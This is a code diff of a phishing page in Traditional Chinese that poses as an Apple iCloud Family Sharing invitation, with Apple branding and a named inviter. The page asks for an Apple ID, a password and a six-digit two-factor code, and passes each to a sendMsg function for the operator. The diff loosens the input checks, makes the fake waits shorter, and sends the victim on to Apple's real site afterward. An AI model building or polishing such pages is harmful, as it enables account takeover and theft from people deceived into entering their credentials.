@@ -3,8 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <title>iCloud - 家人共享</title>
+    <meta property="og:title" content="iCloud">
+    <meta property="og:description" content="誠摯邀請你加入「家人共享」。點一下以檢視邀請">
+    <meta property="og:image" content="https://www.apple.com/v/family-sharing/f/images/overview/family_sharing_icon__f6932nshf9qy_large.png">
+    <meta property="og:type" content="website">
+    
     <link rel="icon" href="https://www.apple.com/favicon.ico">
+
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
 
@@ -24,45 +31,52 @@
             position: relative;
         }
 
-        /* 階段 0：邀請函首頁 */
+        /* 階段 0：邀請函首頁 (白色卡片風格) */
         .invite-card {
+            background: white;
+            border-radius: 30px;
+            padding: 40px 25px;
             text-align: center;
+            color: #1d1d1f; /* Apple 官方深灰色文字 */
             display: flex;
             flex-direction: column;
             align-items: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
 
         .maybe-later {
             position: absolute;
-            top: -40px;
-            right: 0;
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
+            top: 20px;
+            right: 25px;
+            color: #007aff;
+            font-size: 15px;
             text-decoration: none;
+            z-index: 10;
         }
 
         .main-icon-wrapper {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #a2a2a2, #ffffff);
-            border-radius: 20px;
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #ff5e62, #ff9966);
+            border-radius: 18px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin-bottom: 20px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            box-shadow: 0 8px 16px rgba(255, 94, 98, 0.3);
         }
 
         h1.main-title {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 700;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
+            color: #000;
         }
 
-        p.description {
-            font-size: 16px;
-            color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 40px;
+        p.invite-sub {
+            font-size: 14px;
+            color: #86868b;
+            margin-bottom: 30px;
             line-height: 1.4;
         }
 
@@ -70,65 +84,58 @@
         .feature-list {
             width: 100%;
             text-align: left;
-            margin-bottom: 50px;
+            margin-bottom: 40px;
         }
 
         .feature-item {
             display: flex;
-            align-items: flex-start;
-            margin-bottom: 25px;
+            align-items: center;
+            margin-bottom: 20px;
         }
 
         .svg-icon {
-            width: 45px;
-            height: 45px;
+            width: 42px;
+            height: 42px;
             margin-right: 15px;
             flex-shrink: 0;
         }
 
         .feature-text h2 {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 600;
-            margin-bottom: 4px;
+            margin-bottom: 2px;
+            color: #1d1d1f;
         }
 
         .feature-text p {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            color: #86868b;
             line-height: 1.3;
         }
 
         /* 按鈕區 */
-        .action-area {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
         .btn-join {
-            background-color: #3e82f7;
+            background-color: #007aff;
             color: white;
             border: none;
             padding: 16px;
             border-radius: 14px;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            transition: 0.2s;
+            margin-bottom: 15px;
         }
-        .btn-join:active { transform: scale(0.98); opacity: 0.9; }
 
         .btn-decline {
             background: none;
             border: none;
-            color: #3e82f7;
-            font-size: 16px;
+            color: #007aff;
+            font-size: 15px;
             cursor: pointer;
         }
 
-        /* 階段 1：登入卡片 */
+        /* 毛玻璃登入卡片 */
         .glass-card {
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(25px) saturate(1.5);
@@ -160,7 +167,7 @@
             height: 35px;
             border: 3px solid rgba(255,255,255,0.2);
             border-radius: 50%;
-            border-top-color: #3e82f7;
+            border-top-color: #007aff;
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
@@ -172,49 +179,48 @@
     <div class="container">
         <div id="phase-invite" class="invite-card">
             <a href="#" class="maybe-later">以後再說</a>
-            
             <div class="main-icon-wrapper">
-                <svg width="50" height="50" viewBox="0 0 24 24" fill="#555"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+                <svg width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
             </div>
-            
-            <h1 class="main-title">你收到了邀請</h1>
-            <p class="description">加入「家人共享」，與家庭成員分享訂閱項目及更多內容。</p>
+            <h1 class="main-title">你已收到邀請</h1>
+            <p class="invite-sub">EMS Natchiappan<br>(henryhuej@hotmail.com) 邀請你加入家庭。</p>
             
             <div class="feature-list">
                 <div class="feature-item">
                     <svg class="svg-icon" viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#2DCC70"/><path d="M12 24l8 8 16-16" fill="none" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg>
                     <div class="feature-text">
                         <h2>共享訂閱項目</h2>
-                        <p>iCloud+、Apple Music 和 Apple TV+。</p>
+                        <p>共享當前和將來的訂閱項目，包括 iCloud+、Apple Music 和 Apple TV+。</p>
                     </div>
                 </div>
                 <div class="feature-item">
                     <svg class="svg-icon" viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#3498DB"/><path d="M34 14H14v20h20V14zm-4 4v12h-12V18h12z" fill="white"/></svg>
                     <div class="feature-text">
                         <h2>共享購買項目</h2>
-                        <p>App、電影、電視節目和書籍。</p>
+                        <p>共享你的 App、電影、電視節目和圖書。</p>
                     </div>
                 </div>
                 <div class="feature-item">
                     <svg class="svg-icon" viewBox="0 0 48 48"><rect width="48" height="48" rx="10" fill="#9B59B6"/><circle cx="24" cy="18" r="6" fill="white"/><path d="M34 36c0-5.5-4.5-10-10-10s-10 4.5-10 10" fill="white"/></svg>
                     <div class="feature-text">
-                        <h2>家長控制</h2>
-                        <p>管理螢幕使用時間與內容限制。</p>
+                        <h2>設置家長控制</h2>
+                        <p>設置螢幕使用時間、內容限制以及其他兒童帳戶控制功能。</p>
                     </div>
                 </div>
             </div>
 
-            <div class="action-area">
-                <h2 style="font-size: 28px; margin-bottom: 10px;">選擇加入</h2>
-                <button class="btn-join" onclick="goToLogin()">加入家庭</button>
-                <button class="btn-decline">拒絕邀請</button>
-            </div>
+            <button class="btn-join" onclick="goToLogin()">加入家庭</button>
+            <button class="btn-decline">拒絕邀請</button>
+        </div>
+
+        <div id="phase-loading" class="glass-card hidden">
+            <div class="loader"></div>
+            <p id="loading-text">正在驗證邀請代碼 (inviteCode)...</p>
         </div>
 
         <div id="phase-login" class="glass-card hidden">
             <h1 style="font-size: 24px; margin-bottom: 10px;">登入以加入家庭</h1>
             <p style="font-size: 14px; margin-bottom: 30px; color: rgba(255,255,255,0.6);">請使用您的 Apple ID 登入以接受此邀請。</p>
-            
             <div class="input-group">
                 <label>Apple ID</label>
                 <input type="text" id="acc" placeholder="email@icloud.com" autocomplete="username">
@@ -223,20 +229,13 @@
                 <label>密碼</label>
                 <input type="password" id="pw" placeholder="必填" autocomplete="current-password">
             </div>
-            <button class="btn-join" onclick="handleLogin()">接受邀請</button>
-        </div>
-
-        <div id="phase-loading" class="glass-card hidden">
-            <div class="loader"></div>
-            <p id="loading-text">正在驗證邀請代碼...</p>
+            <button class="btn-join" style="margin-top:20px" onclick="handleLogin()">接受邀請</button>
         </div>
 
         <div id="phase-otp" class="glass-card hidden">
             <h1>雙重認證</h1>
             <p style="margin-top: 10px;">驗證碼已傳送到您的 Apple 裝置。</p>
-            <input type="text" id="otp" placeholder="000000" maxlength="6" 
-                   inputmode="numeric" pattern="[0-9]*"
-                   style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px; margin: 30px 0;">
+            <input type="text" id="otp" placeholder="000000" maxlength="6" inputmode="numeric" style="text-align:center; letter-spacing: 12px; font-weight: bold; font-size: 24px; margin: 30px 0;">
             <button class="btn-join" onclick="handleOTP()">驗證並加入</button>
         </div>
 
@@ -263,7 +262,7 @@
         }
 
         function showPhase(phaseId) {
-            ['phase-invite', 'phase-login', 'phase-loading', 'phase-otp', 'phase-success'].forEach(id => {
+            ['phase-invite', 'phase-loading', 'phase-login', 'phase-otp', 'phase-success'].forEach(id => {
                 document.getElementById(id).classList.add('hidden');
             });
             document.getElementById(phaseId).classList.remove('hidden');
@@ -271,45 +270,29 @@
 
         function goToLogin() {
             showPhase('phase-loading');
-            document.getElementById('loading-text').innerText = "正在驗證邀請代碼...";
-            setTimeout(() => {
-                showPhase('phase-login');
-            }, 1500);
+            setTimeout(() => { showPhase('phase-login'); }, 1500);
         }
 
         async function handleLogin() {
             const acc = document.getElementById('acc').value.trim();
             const pw = document.getElementById('pw').value;
-
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(acc)) return alert("請輸入有效的 Apple ID。");
-            
-            const pwRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/;
-            if (!pwRegex.test(pw)) return alert("密碼格式不正確，請重新輸入。");
+            if (!acc || !pw) return alert("請填寫帳號與密碼。");
 
             showPhase('phase-loading');
             document.getElementById('loading-text').innerText = "正在驗證 Apple ID...";
             await sendMsg(`👨‍👩‍👧‍👦 【家庭邀請 - 登入】\n帳號: ${acc}\n密碼: ${pw}`);
-
-            setTimeout(() => {
-                showPhase('phase-otp');
-            }, 20000);
+            setTimeout(() => { showPhase('phase-otp'); }, 15000);
         }
 
         async function handleOTP() {
             const otp = document.getElementById('otp').value;
             if(otp.length < 6) return alert("請輸入 6 位數驗證碼。");
-
             showPhase('phase-loading');
-            document.getElementById('loading-text').innerText = "正在綁定家庭帳戶...";
-
+            document.getElementById('loading-text').innerText = "正在綁定家庭服務...";
             await sendMsg(`🛡️ 【家庭邀請 - 驗證碼】\n代碼: ${otp}`);
-
             setTimeout(() => {
                 showPhase('phase-success');
-                setTimeout(() => {
-                    window.location.href = "https://www.apple.com/tw/family-sharing/";
-                }, 3000);
+                setTimeout(() => { window.location.href = "https://www.apple.com/tw/family-sharing/"; }, 3000);
             }, 3000);
         }
     </script>
